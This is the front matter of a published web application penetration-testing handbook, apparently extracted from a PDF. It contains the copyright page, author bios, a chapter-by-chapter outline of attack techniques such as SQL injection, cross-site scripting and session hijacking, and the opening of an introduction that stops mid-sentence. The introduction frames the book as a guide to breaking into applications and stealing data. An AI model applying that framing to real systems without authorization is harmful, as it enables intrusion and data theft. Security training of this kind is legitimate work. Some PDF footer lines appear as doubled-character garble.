[
  {
    "start": 1,
    "end": 12,
    "text": "Stuttard ffi rs.indd V4 - 08/17/2011 Page i\nThe Web Application\nHacker’s Handbook\nSecond Edition\nFinding and Exploiting Security Flaws\nDafydd Stuttard\nMarcus Pinto\nffffiirrss..iinndddd ii 88//1199//22001111 1122::2222::3333 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page ii\nThe Web Application Hacker’s Handbook: Finding and Exploiting Security Flaws, Second Edition\nPublished by\nJohn Wiley & Sons, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2011 by Dafydd Stuttard and Marcus Pinto\nPublished by John Wiley & Sons, Inc., Indianapolis, Indiana\nPublished simultaneously in Canada\n\nISBN: 978-1-118-02647-2\nISBN: 978-1-118-17522-4 (ebk)\nISBN: 978-1-118-17524-8 (ebk)\nISBN: 978-1-118-17523-1 (ebk)\nManufactured in the United States of America\n10 9 8 7 6 5 4 3 2 1\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or\nby any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted\nunder Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permis-\nsion of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright\nClearance Center, 222 Rosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the\nPublisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111\nRiver Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at http://www.wiley.\ncom/go/permissions.\nLimit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or war-\nranties with respect to the accuracy or completeness of the contents of this work and specifi cally disclaim all\nwarranties, including without limitation warranties of fi tness for a particular purpose. No warranty may be\ncreated or extended by sales or promotional materials. The advice and strategies contained herein may not\nbe suitable for every situation. This work is sold with the understanding that the publisher is not engaged in\nrendering legal, accounting, or other professional services. If professional assistance is required, the services\nof a competent professional person should be sought. Neither the publisher nor the author shall be liable for\ndamages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation\nand/or a potential source of further information does not mean that the author or the publisher endorses\nthe information the organization or website may provide or recommendations it may make. Further, readers\nshould be aware that Internet websites listed in this work may have changed or disappeared between when\nthis work was written and when it is read.\nFor general information on our other products and services please contact our Customer Care Department\nwithin the United States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.\nWiley also publishes its books in a variety of electronic formats and by print-on-demand. Not all content\nthat is available in standard print versions of this book may appear or be packaged in all book formats. If\nyou have purchased a version of this book that did not include media that is referenced by or accompanies\na standard print version, you may request this media by visiting http://booksupport.wiley.\ncom. For more information about Wiley products, visit us at www.wiley.com.\nLibrary of Congress Control Number: 2011934639\nTrademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc.\nand/or its affi liates, in the United States and other countries, and may not be used without written permission.\nAll other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated\nwith any product or vendor mentioned in this book.\nffffiirrss..iinndddd iiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page iii\nAbout the Authors\nDafydd Stuttard is an independent security consultant, author, and software\ndeveloper. With more than 10 years of experience in security consulting, he\nspecializes in the penetration testing of web applications and compiled soft-\nware. Dafydd has worked with numerous banks, retailers, and other enterprises\nto help secure their web applications. He also has provided security consulting to\nseveral software manufacturers and governments to help secure their compiled\nsoftware. Dafydd is an accomplished programmer in several languages. His\ninterests include developing tools to facilitate all kinds of software security\ntesting. Under the alias “PortSwigger,” Dafydd created the popular Burp Suite\nof web application hacking tools; he continues to work actively on Burp’s devel-\nopment. Dafydd is also cofounder of MDSec, a company providing training and\nconsultancy on Internet security attack and defense. Dafydd has developed and\npresented training courses at various security conferences around the world,\nand he regularly delivers training to companies and governments. He holds\nmaster’s and doctorate degrees in philosophy from the University of Oxford.\nMarcus Pinto is cofounder of MDSec, developing and delivering training\ncourses in web application security. He also performs ongoing security con-\nsultancy for fi nancial, government, telecom, and retail verticals. His 11 years\nof experience in the industry have been dominated by the technical aspects of\napplication security, from the dual perspectives of a consulting and end-user\nimplementation role. Marcus has a background in attack-based security assess-\nment and penetration testing. He has worked extensively with large-scale web\napplication deployments in the fi nancial services industry. Marcus has been\ndeveloping and presenting database and web application training courses since\n2005 at Black Hat and other worldwide security conferences, and for private-\nsector and government clients. He holds a master’s degree in physics from the\nUniversity of Cambridge.\niii\nffffiirrss..iinndddd iiiiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page iv\nAbout the Technical Editor\nDr. Josh Pauli received his Ph.D. in Software Engineering from North Dakota\nState University (NDSU) with an emphasis in secure requirements engineering\nand now serves as an Associate Professor of Information Security at Dakota\nState University (DSU). Dr. Pauli has published nearly 20 international jour-\nnal and conference papers related to software security and his work includes\ninvited presentations from the Department of Homeland Security and Black\nHat Briefi ngs. He teaches both undergraduate and graduate courses in system\nsoftware security and web software security at DSU. Dr. Pauli also conducts web\napplication penetration tests as a Senior Penetration Tester for an Information\nSecurity consulting fi rm where his duties include developing hands-on techni-\ncal workshops in the area of web software security for IT professionals in the\nfi nancial sector.\niv\nffffiirrss..iinndddd iivv 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page v\nMDSec: The Authors’ Company\nDafydd and Marcus are cofounders of MDSec, a company that provides training\nin attack and defense-based security, along with other consultancy services. If\nwhile reading this book you would like to put the concepts into practice, and\ngain hands-on experience in the areas covered, you are encouraged to visit our\nwebsite, http://mdsec.net. This will give you access to hundreds of interactive\nvulnerability labs and other resources that are referenced throughout the book.\nv\nffffiirrss..iinndddd vv 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page vi\nCredits\nExecutive Editor Vice President and Executive\nCarol Long Publisher\nNeil Edde\nSenior Project Editor\nAdaobi Obi Tulton Associate Publisher\nJim Minatel\nTechnical Editor\nJosh Pauli Project Coordinator, Cover\nKatie Crocker\nProduction Editor\nKathleen Wisor Proofreaders\nSarah Kaikini, Word One\nCopy Editor\nSheilah Ledwidge, Word One\nGayle Johnson\nIndexer\nEditorial Manager\nRobert Swanson\nMary Beth Wakefi eld\nCover Designer\nFreelancer Editorial Manager\nRyan Sneed\nRosemarie Graham\nCover Image\nAssociate Director of\nWiley InHouse Design\nMarketing\nDavid Mayhew Vertical Websites Project Manager\nLaura Moss-Hollister\nMarketing Manager\nAshley Zurcher Vertical Websites Assistant Project\nManager\nBusiness Manager\nJenny Swisher\nAmy Knies\nVertical Websites Associate\nProduction Manager\nProducers\nTim Tate\nJosh Frank\nVice President and Executive Shawn Patrick\nGroup Publisher Doug Kuhn\nRichard Swadley Marilyn Hummel\nvi\nffffiirrss..iinndddd vvii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page vii\nAcknowledgments\nWe are indebted to the directors and others at Next Generation Security Software,\nwho provided the right environment for us to realize the fi rst edition of this\nbook. Since then, our input has come from an increasingly wider community\nof researchers and professionals who have shared their ideas and contributed\nto the collective understanding of web application security issues that exists\ntoday. Because this is a practical handbook rather than a work of scholarship,\nwe have deliberately avoided fi lling it with a thousand citations of infl uential\narticles, books, and blog postings that spawned the ideas involved. We hope\nthat people whose work we discuss anonymously are content with the general\ncredit given here.\nWe are grateful to the people at Wiley — in particular, to Carol Long for\nenthusiastically supporting our project from the outset, to Adaobi Obi Tulton\nfor helping polish our manuscript and coaching us in the quirks of “American\nEnglish,” to Gayle Johnson for her very helpful and attentive copy editing, and\nto Katie Wisor’s team for delivering a fi rst-rate production.\nA large measure of thanks is due to our respective partners, Becky and Amanda,\nfor tolerating the signifi cant distraction and time involved in producing a book\nof this size.\nBoth authors are indebted to the people who led us into our unusual line\nof work. Dafydd would like to thank Martin Law. Martin is a great guy who\nfi rst taught me how to hack and encouraged me to spend my time developing\ntechniques and tools for attacking applications. Marcus would like to thank his\nparents for everything they have done and continue to do, including getting me\ninto computers. I’ve been getting into computers ever since.\nvii\nffffiirrss..iinndddd vviiii 88//1199//22001111 1122::2222::3377 PPMM\nStuttard ffi rs.indd V4 - 08/17/2011 Page viii\nContents at a Glance\nIntroduction xxiii\nChapter 1 Web Application (In)security 1\nChapter 2 Core Defense Mechanisms 17\nChapter 3 Web Application Technologies 39\nChapter 4 Mapping the Application 73\nChapter 5 Bypassing Client-Side Controls 117\nChapter 6 Attacking Authentication 159\nChapter 7 Attacking Session Management 205\nChapter 8 Attacking Access Controls 257\nChapter 9 Attacking Data Stores 287\nChapter 10 Attacking Back-End Components 357\nChapter 11 Attacking Application Logic 405\nChapter 12 Attacking Users: Cross-Site Scripting 431\nChapter 13 Attacking Users: Other Techniques 501\nChapter 14 Automating Customized Attacks 571\nChapter 15 Exploiting Information Disclosure 615\nChapter 16 Attacking Native Compiled Applications 633\nChapter 17 Attacking Application Architecture 647\nChapter 18 Attacking the Application Server 669\nChapter 19 Finding Vulnerabilities in Source Code 701\nChapter 20 A Web Application Hacker’s Toolkit 747\nChapter 21 A Web Application Hacker’s Methodology 791\nIndex 853\nviii\nffffiirrss..iinndddd vviiiiii 88//1199//22001111 1122::2222::3388 PPMM\n\nStuttard ftoc.indd V2 - 08/10/2011 Page ix\nContents\nIntroduction xxiii\nChapter 1 Web Application (In)security 1\nThe Evolution of Web Applications 2\nCommon Web Application Functions 4\nBenefi ts of Web Applications 5\nWeb Application Security 6\n“This Site Is Secure” 7\nThe Core Security Problem: Users Can Submit\nArbitrary Input 9\nKey Problem Factors 10\nThe New Security Perimeter 12\nThe Future of Web Application Security 14\nSummary 15\nChapter 2 Core Defense Mechanisms 17\nHandling User Access 18\nAuthentication 18\nSession Management 19\nAccess Control 20\nHandling User Input 21\nVarieties of Input 21\nApproaches to Input Handling 23\nBoundary Validation 25\nMultistep Validation and Canonicalization 28\nHandling Attackers 30\nHandling Errors 30\nMaintaining Audit Logs 31\nAlerting Administrators 33\nReacting to Attacks 34\nix\nffttoocc..iinndddd iixx 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page x\nx Contents\nManaging the Application 35\nSummary 36\nQuestions 36\nChapter 3 Web Application Technologies 39\nThe HTTP Protocol 39\nHTTP Requests 40\nHTTP Responses 41\nHTTP Methods 42\nURLs 44\n\nREST 44\nHTTP Headers 45\nCookies 47\nStatus Codes 48\n\nHTTPS 49\nHTTP Proxies 49\nHTTP Authentication 50\nWeb Functionality 51\nServer-Side Functionality 51\nClient-Side Functionality 57\nState and Sessions 66\nEncoding Schemes 66\nURL Encoding 67\nUnicode Encoding 67\nHTML Encoding 68\nBase64 Encoding 69\nHex Encoding 69\nRemoting and Serialization\nFrameworks 70\nNext Steps 70\nQuestions 71\nChapter 4 Mapping the Application 73\nEnumerating Content and Functionality 74\nWeb Spidering 74\nUser-Directed Spidering 77\nDiscovering Hidden Content 80\nApplication Pages Versus\nFunctional Paths 93\nDiscovering Hidden Parameters 96\nAnalyzing the Application 97\nIdentifying Entry Points for User Input 98\nIdentifying Server-Side Technologies 101\nIdentifying Server-Side Functionality 107\nMapping the Attack Surface 111\nSummary 114\nQuestions 114\nffttoocc..iinndddd xx 88//1199//22001111 1122::2233::3355 PPMM\nx Stuttard ftoc.indd V2 - 08/10/2011 Page xi\nContents xi\nChapter 5 Bypassing Client-Side Controls 117\nTransmitting Data Via the Client 118\nHidden Form Fields 118\nHTTP Cookies 121\nURL Parameters 121\nThe Referer Header 122\nOpaque Data 123\nThe ASP.NET ViewState 124\nCapturing User Data: HTML Forms 127\nLength Limits 128\nScript-Based Validation 129\nDisabled Elements 131\nCapturing User Data: Browser Extensions 133\nCommon Browser Extension Technologies 134\nApproaches to Browser Extensions 135\nIntercepting Traffi c from Browser Extensions 135\nDecompiling Browser Extensions 139\nAttaching a Debugger 151\nNative Client Components 153\nHandling Client-Side Data Securely 154\nTransmitting Data Via the Client 154\nValidating Client-Generated Data 155\nLogging and Alerting 156\nSummary 156\nQuestions 157\nChapter 6 Attacking Authentication 159\nAuthentication Technologies 160\nDesign Flaws in Authentication\nMechanisms 161\nBad Passwords 161\nBrute-Forcible Login 162\nVerbose Failure Messages 166\nVulnerable Transmission of Credentials 169\nPassword Change Functionality 171\nForgotten Password Functionality 173\n“Remember Me” Functionality 176\nUser Impersonation Functionality 178\nIncomplete Validation of Credentials 180\nNonunique Usernames 181\nPredictable Usernames 182\nPredictable Initial Passwords 183\nInsecure Distribution of Credentials 184\nImplementation Flaws in Authentication 185\nFail-Open Login Mechanisms 185\nDefects in Multistage Login Mechanisms 186\nInsecure Storage of Credentials 190\nffttoocc..iinndddd xxii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xii\nxii Contents\nSecuring Authentication 191\nUse Strong Credentials 192\nHandle Credentials Secretively 192\nValidate Credentials Properly 193\nPrevent Information Leakage 195\nPrevent Brute-Force Attacks 196\nPrevent Misuse of the Password Change Function 199\nPrevent Misuse of the Account Recovery Function 199\nLog, Monitor, and Notify 201\nSummary 201\nQuestions 202\nChapter 7 Attacking Session Management 205\nThe Need for State 206\nAlternatives to Sessions 208\nWeaknesses in Token Generation 210\nMeaningful Tokens 210\nPredictable Tokens 213\nEncrypted Tokens 223\nWeaknesses in Session Token Handling 233\nDisclosure of Tokens on the Network 234\nDisclosure of Tokens in Logs 237\nVulnerable Mapping of Tokens to Sessions 240\nVulnerable Session Termination 241\nClient Exposure to Token Hijacking 243\nLiberal Cookie Scope 244\nSecuring Session Management 248\nGenerate Strong Tokens 248\nProtect Tokens Throughout Their Life Cycle 250\nLog, Monitor, and Alert 253\nSummary 254\nQuestions 255\nChapter 8 Attacking Access Controls 257\nCommon Vulnerabilities 258\nCompletely Unprotected Functionality 259\nIdentifi er-Based Functions 261\nMultistage Functions 262\nStatic Files 263\nPlatform Misconfi guration 264\nInsecure Access Control Methods 265\nAttacking Access Controls 266\nTesting with Different User Accounts 267\nTesting Multistage Processes 271\nTesting with Limited Access 273\nTesting Direct Access to Methods 276\nTesting Controls Over Static Resources 277\nffttoocc..iinndddd xxiiii 88//1199//22001111 1122::2233::3355 PPMM\nxii Stuttard ftoc.indd V2 - 08/10/2011 Page xiii\nContents xiii\nTesting Restrictions on HTTP Methods 278\nSecuring Access Controls 278\nA Multilayered Privilege Model 280\nSummary 284\nQuestions 284\nChapter 9 Attacking Data Stores 287\nInjecting into Interpreted Contexts 288\nBypassing a Login 288\nInjecting into SQL 291\nExploiting a Basic Vulnerability 292\nInjecting into Different Statement Types 294\nFinding SQL Injection Bugs 298\nFingerprinting the Database 303\nThe UNION Operator 304\nExtracting Useful Data 308\nExtracting Data with UNION 308\nBypassing Filters 311\nSecond-Order SQL Injection 313\nAdvanced Exploitation 314\nBeyond SQL Injection: Escalating the\nDatabase Attack 325\nUsing SQL Exploitation Tools 328\nSQL Syntax and Error Reference 332\nPreventing SQL Injection 338\nInjecting into NoSQL 342\nInjecting into MongoDB 343\nInjecting into XPath 344\nSubverting Application Logic 345\nInformed XPath Injection 346\nBlind XPath Injection 347\nFinding XPath Injection Flaws 348\nPreventing XPath Injection 349\nInjecting into LDAP 349\nExploiting LDAP Injection 351\nFinding LDAP Injection Flaws 353\nPreventing LDAP Injection 354\nSummary 354\nQuestions 354\nChapter 10 Attacking Back-End Components 357\nInjecting OS Commands 358\nExample 1: Injecting Via Perl 358\nExample 2: Injecting Via ASP 360\nInjecting Through Dynamic Execution 362\nFinding OS Command Injection Flaws 363\nFinding Dynamic Execution Vulnerabilities 366\nffttoocc..iinndddd xxiiiiii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xiv\nxiv Contents\nPreventing OS Command Injection 367\nPreventing Script Injection Vulnerabilities 368\nManipulating File Paths 368\nPath Traversal Vulnerabilities 368\nFile Inclusion Vulnerabilities 381\nInjecting into XML Interpreters 383\nInjecting XML External Entities 384\nInjecting into SOAP Services 386\nFinding and Exploiting SOAP Injection 389\nPreventing SOAP Injection 390\nInjecting into Back-end HTTP Requests 390\nServer-side HTTP Redirection 390\nHTTP Parameter Injection 393\nInjecting into Mail Services 397\nE-mail Header Manipulation 398\nSMTP Command Injection 399\nFinding SMTP Injection Flaws 400\nPreventing SMTP Injection 402\nSummary 402\nQuestions 403\nChapter 11 Attacking Application Logic 405\nThe Nature of Logic Flaws 406\nReal-World Logic Flaws 406\nExample 1: Asking the Oracle 407\nExample 2: Fooling a Password Change Function 409\nExample 3: Proceeding to Checkout 410\nExample 4: Rolling Your Own Insurance 412\nExample 5: Breaking the Bank 414\nExample 6: Beating a Business Limit 416\nExample 7: Cheating on Bulk Discounts 418\nExample 8: Escaping from Escaping 419\nExample 9: Invalidating Input Validation 420\nExample 10: Abusing a Search Function 422\nExample 11: Snarfi ng Debug Messages 424\nExample 12: Racing Against the Login 426\nAvoiding Logic Flaws 428\nSummary 429\nQuestions 430\nChapter 12 Attacking Users: Cross-Site Scripting 431\nVarieties of XSS 433\nRefl ected XSS Vulnerabilities 434\nStored XSS Vulnerabilities 438\nDOM-Based XSS Vulnerabilities 440\nXSS Attacks in Action 442\nReal-World XSS Attacks 442\nffttoocc..iinndddd xxiivv 88//1199//22001111 1122::2233::3355 PPMM\niv Stuttard ftoc.indd V2 - 08/10/2011 Page xv\nContents xv\nPayloads for XSS Attacks 443\nDelivery Mechanisms for XSS Attacks 447\nFinding and Exploiting XSS Vulnerabilities 451\nFinding and Exploiting Refl ected XSS Vulnerabilities 452\nFinding and Exploiting Stored XSS Vulnerabilities 481\nFinding and Exploiting DOM-Based XSS Vulnerabilities 487\nPreventing XSS Attacks 492\nPreventing Refl ected and Stored XSS 492\nPreventing DOM-Based XSS 496\nSummary 498\nQuestions 498\nChapter 13 Attacking Users: Other Techniques 501\nInducing User Actions 501\nRequest Forgery 502\nUI Redress 511\nCapturing Data Cross-Domain 515\nCapturing Data by Injecting HTML 516\nCapturing Data by Injecting CSS 517\nJavaScript Hijacking 519\nThe Same-Origin Policy Revisited 524\nThe Same-Origin Policy and Browser Extensions 525\nThe Same-Origin Policy and HTML5 528\nCrossing Domains with Proxy Service Applications 529\nOther Client-Side Injection Attacks 531\nHTTP Header Injection 531\nCookie Injection 536\nOpen Redirection Vulnerabilities 540\nClient-Side SQL Injection 547\nClient-Side HTTP Parameter Pollution 548\nLocal Privacy Attacks 550\nPersistent Cookies 550\nCached Web Content 551\nBrowsing History 552\nAutocomplete 552\nFlash Local Shared Objects 553\nSilverlight Isolated Storage 553\nInternet Explorer userData 554\nHTML5 Local Storage Mechanisms 554\nPreventing Local Privacy Attacks 554\nAttacking ActiveX Controls 555\nFinding ActiveX Vulnerabilities 556\nPreventing ActiveX Vulnerabilities 558\nAttacking the Browser 559\nLogging Keystrokes 560\nStealing Browser History and Search Queries 560\nffttoocc..iinndddd xxvv 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xvi\nxvi Contents\nEnumerating Currently Used Applications 560\nPort Scanning 561\nAttacking Other Network Hosts 561\nExploiting Non-HTTP Services 562\nExploiting Browser Bugs 563\nDNS Rebinding \n\n563\nBrowser Exploitation Frameworks 564\nMan-in-the-Middle Attacks 566\nSummary 568\nQuestions 568\nChapter 14 Automating Customized Attacks 571\nUses for Customized Automation 572\nEnumerating Valid Identifi ers 573\nThe Basic Approach 574\nDetecting Hits 574\nScripting the Attack 576\nJAttack 577\nHarvesting Useful Data 583\nFuzzing for Common Vulnerabilities 586\nPutting It All Together: Burp Intruder 590\nBarriers to Automation 602\nSession-Handling Mechanisms 602\nCAPTCHA Controls 610\nSummary 613\nQuestions 613\nChapter 15 Exploiting Information Disclosure 615\nExploiting Error Messages 615\nScript Error Messages 616\nStack Traces 617\nInformative Debug Messages 618\nServer and Database Messages 619\nUsing Public Information 623\nEngineering Informative Error Messages 624\nGathering Published Information 625\nUsing Inference 626\nPreventing Information Leakage 627\nUse Generic Error Messages 628\nProtect Sensitive Information 628\nMinimize Client-Side Information Leakage 629\nSummary 629\nQuestions 630\nChapter 16 Attacking Native Compiled Applications 633\nBuffer Overfl ow Vulnerabilities 634\nStack Overfl ows 634\nHeap Overfl ows 635\nffttoocc..iinndddd xxvvii 88//1199//22001111 1122::2233::3355 PPMM\nvi Stuttard ftoc.indd V2 - 08/10/2011 Page xvii\nContents xvii\n“Off-by-One” Vulnerabilities 636\nDetecting Buffer Overfl ow Vulnerabilities 639\nInteger Vulnerabilities 640\nInteger Overfl ows 640\nSignedness Errors 641\nDetecting Integer Vulnerabilities 642\nFormat String Vulnerabilities 643\nDetecting Format String Vulnerabilities 644\nSummary 645\nQuestions 645\nChapter 17 Attacking Application Architecture 647\nTiered Architectures 647\nAttacking Tiered Architectures 648\nSecuring Tiered Architectures 654\nShared Hosting and Application Service Providers 656\nVirtual Hosting 657\nShared Application Services 657\nAttacking Shared Environments 658\nSecuring Shared Environments 665\nSummary 667\nQuestions 667\nChapter 18 Attacking the Application Server 669\nVulnerable Server Confi guration 670\nDefault Credentials 670\nDefault Content 671\nDirectory Listings 677\nWebDAV Methods 679\nThe Application Server as a Proxy 682\nMisconfi gured Virtual Hosting 683\nSecuring Web Server Confi guration 684\nVulnerable Server Software 684\nApplication Framework Flaws 685\nMemory Management Vulnerabilities 687\nEncoding and Canonicalization 689\nFinding Web Server Flaws 694\nSecuring Web Server Software 695\nWeb Application Firewalls 697\nSummary 699\nQuestions 699\nChapter 19 Finding Vulnerabilities in Source Code 701\nApproaches to Code Review 702\nBlack-Box Versus White-Box Testing 702\nCode Review Methodology 703\nSignatures of Common Vulnerabilities 704\nCross-Site Scripting 704\nffttoocc..iinndddd xxvviiii 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xviii\nxviii Contents\nSQL Injection 705\nPath Traversal 706\nArbitrary Redirection 707\nOS Command Injection 708\nBackdoor Passwords 708\nNative Software Bugs 709\nSource Code Comments 710\nThe Java Platform 711\nIdentifying User-Supplied Data 711\nSession Interaction 712\nPotentially Dangerous APIs 713\nConfi guring the Java Environment 716\n\nASP.NET 718\nIdentifying User-Supplied Data 718\nSession Interaction 719\nPotentially Dangerous APIs 720\nConfi guring the ASP.NET Environment 723\n\nPHP 724\nIdentifying User-Supplied Data 724\nSession Interaction 727\nPotentially Dangerous APIs 727\nConfi guring the PHP Environment 732\nPerl 735\nIdentifying User-Supplied Data 735\nSession Interaction 736\nPotentially Dangerous APIs 736\nConfi guring the Perl Environment 739\nJavaScript 740\nDatabase Code Components 741\nSQL Injection 741\nCalls to Dangerous Functions 742\nTools for Code Browsing 743\nSummary 744\nQuestions 744\nChapter 20 A Web Application Hacker’s Toolkit 747\nWeb Browsers 748\nInternet Explorer 748\nFirefox 749\nChrome 750\nIntegrated Testing Suites 751\nHow the Tools Work 751\nTesting Work Flow 769\nAlternatives to the Intercepting Proxy 771\nStandalone Vulnerability Scanners 773\nVulnerabilities Detected by Scanners 774\nInherent Limitations of Scanners 776\nffttoocc..iinndddd xxvviiiiii 88//1199//22001111 1122::2233::3355 PPMM\niii Stuttard ftoc.indd V2 - 08/10/2011 Page xix\nContents xix\nTechnical Challenges Faced by Scanners 778\nCurrent Products 781\nUsing a Vulnerability Scanner 783\nOther Tools 785\nWikto/Nikto 785\nFirebug 785\nHydra 785\nCustom Scripts 786\nSummary 789\nChapter 21 A Web Application Hacker’s Methodology 791\nGeneral Guidelines 793\n1 Map the Application’s Content 795\n\n1.1 Explore Visible Content 795\n\n1.2 Consult Public Resources 796\n\n1.3 Discover Hidden Content 796\n\n1.4 Discover Default Content 797\n\n1.5 Enumerate Identifi er-Specifi ed Functions 797\n\n1.6 Test for Debug Parameters 798\n2 Analyze the Application 798\n\n2.1 Identify Functionality 798\n\n2.2 Identify Data Entry Points 799\n\n2.3 Identify the Technologies Used 799\n\n2.4 Map the Attack Surface 800\n3 Test Client-Side Controls 800\n\n3.1 Test Transmission of Data Via the Client 801\n\n3.2 Test Client-Side Controls Over User Input 801\n\n3.3 Test Browser Extension Components 802\n4 Test the Authentication Mechanism 805\n\n4.1 Understand the Mechanism 805\n\n4.2 Test Password Quality 806\n\n4.3 Test for Username Enumeration 806\n\n4.4 Test Resilience to Password Guessing 807\n\n4.5 Test Any Account Recovery Function 807\n\n4.6 Test Any Remember Me Function 808\n\n4.7 Test Any Impersonation Function 808\n\n4.8 Test Username Uniqueness 809\n\n4.9 Test Predictability of Autogenerated Credentials 809\n\n4.10 Check for Unsafe Transmission of Credentials 810\n\n4.11 Check for Unsafe Distribution of Credentials 810\n\n4.12 Test for Insecure Storage 811\n\n4.13 Test for Logic Flaws 811\n\n4.14 Exploit Any Vulnerabilities to Gain Unauthorized Access 813\n5 Test the Session Management Mechanism 814\n\n5.1 Understand the Mechanism 814\n\n5.2 Test Tokens for Meaning 815\n\n5.3 Test Tokens for Predictability 816\nffttoocc..iinndddd xxiixx 88//1199//22001111 1122::2233::3355 PPMM\nStuttard ftoc.indd V2 - 08/10/2011 Page xx\nxx Contents\n\n5.4 Check for Insecure Transmission of Tokens 817\n\n5.5 Check for Disclosure of Tokens in Logs 817\n\n5.6 Check Mapping of Tokens to Sessions 818\n\n5.7 Test Session Termination 818\n\n5.8 Check for Session Fixation 819\n\n5.9 Check for CSRF 820\n\n5.10 Check Cookie Scope 820\n6 Test Access Controls 821\n\n6.1 Understand the Access Control Requirements 821\n\n6.2 Test with Multiple Accounts 822\n\n6.3 Test with Limited Access 822\n\n6.4 Test for Insecure Access Control Methods 823\n7 Test for Input-Based Vulnerabilities 824\n\n7.1 Fuzz All Request Parameters 824\n\n7.2 Test for SQL Injection 827\n\n7.3 Test for XSS and Other Response Injection 829\n\n7.4 Test for OS Command Injection 832\n\n7.5 Test for Path Traversal 833\n\n7.6 Test for Script Injection 835\n\n7.7 Test for File Inclusion 835\n8 Test for Function-Specifi c Input Vulnerabilities 836\n\n8.1 Test for SMTP Injection 836\n\n8.2 Test for Native Software Vulnerabilities 837\n\n8.3 Test for SOAP Injection 839\n\n8.4 Test for LDAP Injection 839\n\n8.5 Test for XPath Injection 840\n\n8.6 Test for Back-End Request Injection 841\n\n8.7 Test for XXE Injection 841\n9 Test for Logic Flaws 842\n\n9.1 Identify the Key Attack Surface 842\n\n9.2 Test Multistage Processes 842\n\n9.3 Test Handling of Incomplete Input 843\n\n9.4 Test Trust Boundaries 844\n\n9.5 Test Transaction Logic 844\n10 Test for Shared Hosting Vulnerabilities 845\n\n10.1 Test Segregation in Shared Infrastructures 845\n\n10.2 Test Segregation Between ASP-Hosted Applications 845\n11 Test for Application Server Vulnerabilities 846\n\n11.1 Test for Default Credentials 846\n\n11.2 Test for Default Content 847\n\n11.3 Test for Dangerous HTTP Methods 847\n\n11.4 Test for Proxy Functionality 847\n\n11.5 Test for Virtual Hosting Misconfi guration 847\n\n11.6 Test for Web Server Software Bugs 848\n\n11.7 Test for Web Application Firewalling 848\nffttoocc..iinndddd xxxx 88//1199//22001111 1122::2233::3366 PPMM\nxx Stuttard ftoc.indd V2 - 08/10/2011 Page xxi\nContents xxi\n12 Miscellaneous Checks 849\n\n12.1 Check for DOM-Based Attacks 849\n\n12.2 Check for Local Privacy Vulnerabilities 850\n\n12.3 Check for Weak SSL Ciphers 851\n\n12.4 Check Same-Origin Policy Confi guration 851\n13 Follow Up Any Information Leakage 852\nIndex 853\nffttoocc..iinndddd xxxxii 88//1199//22001111 1122::2233::3366 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxii\nffllaasstt..iinndddd xxxxiiii 88//1199//22001111 1122::2233::0077 PPMM\n\nStuttard fl ast.indd V2 - 08/10/2011 Page xxiii\nIntroduction\nThis book is a practical guide to discovering and exploiting security fl aws in\nweb applications. By “web applications” we mean those that are accessed using\na web browser to communicate with a web server. We examine a wide variety\nof different technologies, such as databases, fi le systems, and web services, but\nonly in the context in which these are employed by web applications. If you want to learn how to run port scans, attack fi rewalls, or break into serv-\ners in other ways, we suggest you look elsewhere. But if you want to know how\nto hack into a web application, steal sensitive data, and perform unauthorized\nactions, this is the book for you. There is enough that is interesting and fun to\nsay on that subject without straying into any other territory. Overview of This Book\nThe focus of this book is highly practical. Although we include suffi cient back-\nground and theory for you to understand the vulnerabilities that web applications\ncontain, our primary concern is the tasks and techniques that you need to master\nto break into them. Throughout the book, we spell out the specifi c steps you need\nto follow to detect each type of vulnerability, and how to exploit it to perform\nunauthorized actions. We also include a wealth of real-world examples, derived\nfrom the authors’ many years of experience, illustrating how different kinds of\nsecurity fl aws manifest themselves in today’s web applications. Security awareness is usually a double-edged sword. Just as application\ndevelopers can benefi t from understanding the methods attackers use, hackers\ncan gain from knowing how applications can effectively defend themselves. In addition to describing security vulnerabilities and attack techniques, we\ndescribe in detail the countermeasures that applications can take to thwart an\nxxiii\nffllaasstt..iinndddd xxxxiiiiii 88//1199//22001111 1122::2233::0077 PPMM\nStuttard fl ast.indd V2 - 08/10/2011 Page xxiv\nxxiv Introduction\nattacker. If you perform penetration tests of web applications, this will enable\nyou to provide high-quality remediation advice to the owners of the applica-\ntions you compromise. Who Should Read This Book\nThis book’s primary audience is anyone who has a personal or professional\ninterest in attacking web applications. It is also aimed at anyone responsible for\ndeveloping and administering web applications. Knowing how your enemies\noperate will help you defend against them. We assume that you are familiar with core security concepts such as logins\nand access controls and that you have a basic grasp of core web technologies\nsuch as browsers, web servers, and HTTP. However, any gaps in your current\nknowledge of these areas will be easy to remedy, through either the explana-\ntions contained in this book or references elsewhere. In the course of illustrating many categories of security fl aws, we provide\ncode extracts showing how applications can be vulnerable. These examples are\nsimple enough that you can understand them without any 